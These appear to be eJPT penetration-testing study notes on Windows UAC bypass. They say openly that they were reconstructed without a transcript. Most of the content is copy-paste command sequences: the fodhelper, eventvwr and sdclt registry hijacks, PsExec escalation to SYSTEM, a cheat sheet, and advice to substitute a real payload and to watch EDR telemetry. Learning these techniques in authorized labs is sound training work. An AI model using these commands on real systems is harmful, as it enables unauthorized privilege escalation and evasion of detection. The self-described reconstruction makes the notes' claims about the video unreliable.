# 04 – Windows Privilege Escalation: Bypassing UAC

Note: No transcript was provided. The notes below are a conservative reconstruction based on the filename and typical eJPT Windows post-exploitation content. Use only in lab environments with explicit authorization.

## What the video covers (Introduction / big picture)
- What UAC is and why it’s not a security boundary: it mediates elevation for members of the local Administrators group (split token), but does not help standard users become admins.
- The goal: from a low/medium-integrity shell running as a local admin (unelevated), obtain a high-integrity admin shell without triggering (or by abusing) UAC.
- Typical UAC bypass techniques leveraging auto-elevated Windows binaries (LOLbins) and HKCU registry hijacks:
  - fodhelper.exe (most reliable on many Win10 builds)
  - eventvwr.exe (legacy)
  - sdclt.exe (legacy, older builds)
- How to check prerequisites, execute the bypass, verify elevation, and clean up.

## Flow (ordered)
1. Confirm current user context and integrity level.
2. Verify you’re in local Administrators (split-token admin) and UAC is enabled.
3. Choose a bypass method (prefer fodhelper.exe).
4. Set the registry hijack in HKCU for the chosen LOLbin.
5. Trigger the auto-elevated binary to spawn a high-integrity shell.
6. Verify elevation (High Mandatory Level).
7. Clean up registry artifacts.
8. Optional: pivot from high-integrity admin to SYSTEM (e.g., PsExec) if needed.

## Tools highlighted
- Built-in:
  - cmd.exe, PowerShell
  - reg.exe
  - whoami
  - fodhelper.exe, eventvwr.exe, sdclt.exe
- Optional/enum:
  - winPEAS/PowerUp (enumeration)
- Optional post-bypass:
  - PsExec (Sysinternals) to get SYSTEM

## Typical command walkthrough (detailed, copy-paste friendly)

Legal/ethical reminder: Do this only on systems you are authorized to test.

### 0) Quick recon: user, integrity, UAC
```bat
:: Who am I and integrity info
whoami /user
whoami /groups | findstr /i "mandatory administrators"

:: Am I in Administrators (split token)? (look for BUILTIN\Administrators)
net localgroup administrators

:: UAC settings (1 = enabled, 0 = disabled)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

:: Admin prompt behavior (common default = 5)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

:: Secure desktop prompt (1 = on)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
```
Interpretation:
- You must already be a local admin (split-token) for UAC bypasses to work.
- If EnableLUA=0 and you’re admin, you’re already fully elevated (no bypass needed).

### 1) Method A (recommended): fodhelper.exe UAC bypass
- Works on many Windows 10 builds (default UAC = “Notify me only when apps try to make changes (default)”).
- Technique: Hijack HKCU class ms-settings DelegateExecute to run your command.

CMD version:
```bat
:: Set payload for elevated shell (here: launch a new elevated cmd)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe /c start cmd.exe"
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /v "DelegateExecute" /t REG_SZ /d ""

:: Trigger fodhelper (use Sysnative if 32-bit shell on 64-bit OS)
if exist "%windir%\Sysnative\fodhelper.exe" (
  %windir%\Sysnative\fodhelper.exe
) else (
  %windir%\System32\fodhelper.exe
)

:: Verify High integrity
whoami /groups | findstr /i "Mandatory Label\High"
```

PowerShell version:
```powershell
# Payload: open elevated cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /f /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" | Out-Null
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /f /v "DelegateExecute" /t REG_SZ /d "" | Out-Null

# Trigger fodhelper
$path = "$env:windir\System32\fodhelper.exe"
if (Test-Path "$env:windir\Sysnative\fodhelper.exe") { $path = "$env:windir\Sysnative\fodhelper.exe" }
Start-Process -FilePath $path

# Verify
whoami /groups | findstr /i "Mandatory Label\High"
```

Cleanup:
```bat
reg delete HKCU\Software\Classes\ms-settings /f
```

### 2) Method B (legacy): eventvwr.exe file association hijack
- Often patched on newer Windows 10 builds; may still work on older systems (Win7/Win8/early Win10).
- Technique: Override HKCU mscfile association so eventvwr (auto-elevated) triggers your payload.

```bat
reg add HKCU\Software\Classes\mscfile\shell\open\command /f /ve /t REG_SZ /d "cmd.exe /c start cmd.exe"
start "" %windir%\System32\eventvwr.exe

whoami /groups | findstr /i "Mandatory Label\High"

:: Cleanup
reg delete HKCU\Software\Classes\mscfile /f
```

### 3) Method C (legacy): sdclt.exe UAC bypass (older builds)
- Typically works on older Windows 10 (pre-1709). Patched in newer versions.
- Technique: Hijack HKCU Folder shell open with DelegateExecute; trigger sdclt.

```bat
reg add HKCU\Software\Classes\Folder\shell\open\command /f /ve /t REG_SZ /d "cmd.exe /c start cmd.exe"
reg add HKCU\Software\Classes\Folder\shell\open\command /f /v "DelegateExecute" /t REG_SZ /d ""

%windir%\System32\sdclt.exe

whoami /groups | findstr /i "Mandatory Label\High"

:: Cleanup
reg delete HKCU\Software\Classes\Folder /f
```

### Optional: spawn SYSTEM after UAC bypass (post-bypass)
If you need NT AUTHORITY\SYSTEM and you’re now high-integrity admin:

Using PsExec (Sysinternals; requires admin rights):
```bat
psexec64.exe -accepteula -i -s cmd.exe
whoami
```

## Practical tips
- Prerequisite: UAC bypasses target split-token admins. If you’re a standard user, these won’t make you admin.
- UAC level matters: Consumer defaults (value 5) are the common target. “Always notify” or enterprise hardening may block these.
- 32-bit to 64-bit quirk: From a 32-bit shell on 64-bit Windows, use %windir%\Sysnative\ to reach 64-bit auto-elevated binaries (e.g., Sysnative\fodhelper.exe).
- Payload choice: Replace "cmd.exe /c start cmd.exe" with your actual payload (e.g., start powershell, run a service installer, launch your agent).
- Verify elevation: Look for “Mandatory Label\High Mandatory Level”. Also check that BUILTIN\Administrators is no longer DenyOnly.
- Clean up every key you set. Leaving HKCU\Software\Classes overrides can break shell behavior and is noisy.
- Detection: Many EDRs flag these sequences. In labs, that’s fine; in real engagements, be mindful of telemetry (reg, process creation, LOLbin execution).
- Alternatives if patched: Explore other UAC bypasses (cmstp.exe INF, SilentCleanup env hijack, COM-based methods) or escalate via different privilege escalation paths (services, unquoted paths, weak folder perms).

## Minimal cheat sheet (one-screen flow)
```bat
:: 1) Check context
whoami /groups | findstr /i "administrators mandatory"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

:: 2) Fodhelper UAC bypass
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe /c start cmd.exe"
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /v "DelegateExecute" /t REG_SZ /d ""
if exist "%windir%\Sysnative\fodhelper.exe" (%windir%\Sysnative\fodhelper.exe) else (%windir%\System32\fodhelper.exe)

:: 3) Verify, then cleanup
whoami /groups | findstr /i "Mandatory Label\High"
reg delete HKCU\Software\Classes\ms-settings /f
```

## Summary
- UAC bypass elevates a split-token admin from medium to high integrity by abusing auto-elevated Windows binaries and HKCU registry hijacks.
- The fodhelper.exe method is commonly reliable on default Windows 10 UAC settings; eventvwr.exe and sdclt.exe are legacy/patch-dependent.
- Always confirm prerequisites (local admin + UAC enabled), verify the resulting integrity level, and clean up your registry changes.
- If needed, transition from high-integrity admin to SYSTEM with tools like PsExec.